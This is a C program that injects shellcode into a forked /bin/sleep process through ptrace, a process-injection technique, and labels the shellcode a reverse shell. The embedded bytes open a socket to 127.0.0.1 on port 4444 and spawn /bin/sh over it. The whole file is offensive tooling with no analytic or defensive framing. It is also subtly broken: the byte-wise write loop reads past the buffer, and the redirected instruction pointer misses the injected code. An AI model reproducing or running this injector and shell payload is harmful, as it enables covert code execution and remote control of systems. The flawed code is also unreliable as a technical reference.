#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/ptrace.h>
#include <sys/wait.h>
#include <sys/user.h>

void hollow_process() {
    pid_t pid;
    struct user_regs_struct regs;
    
    pid = fork();
    
    if(pid == 0) {
        // Child process
        ptrace(PTRACE_TRACEME, 0, NULL, NULL);
        execl("/bin/sleep", "sleep", "1000", NULL);
    } else {
        // Parent process
        wait(NULL);
        
        // Get registers
        ptrace(PTRACE_GETREGS, pid, NULL, &regs);
        
        // Shellcode for reverse shell
        char shellcode[] = 
            "\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x4d\x31\xc0"
            "\x6a\x02\x5f\x6a\x01\x5e\x6a\x06\x5a\x6a\x29\x58\x0f\x05\x49"
            "\x89\xc4\x48\x31\xc0\x50\x68\x7f\x00\x00\x01\x66\x68\x11\x5c"
            "\x66\x6a\x02\x48\x31\xf6\x6a\x2a\x58\x48\x89\xe7\xb2\x10\x0f"
            "\x05\x48\x31\xc0\x6a\x03\x5e\x48\xff\xce\x78\x0f\x6a\x21\x58"
            "\x0f\x05\x75\xf6\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f"
            "\x2f\x73\x68\x53\x48\x89\xe7\x50\x48\x89\xe2\x57\x48\x89\xe6"
            "\x6a\x3b\x58\x0f\x05";
        
        // Write shellcode to process memory
        for(int i = 0; i < sizeof(shellcode); i++) {
            ptrace(PTRACE_POKETEXT, pid, regs.rip + i, 
                   *(long *)(shellcode + i));
        }
        
        // Set new entry point
        regs.rip = regs.rip + 0x100;
        ptrace(PTRACE_SETREGS, pid, NULL, &regs);
        
        // Resume execution
        ptrace(PTRACE_DETACH, pid, NULL, NULL);
    }
}

int main() {
    hollow_process();
    return 0;
}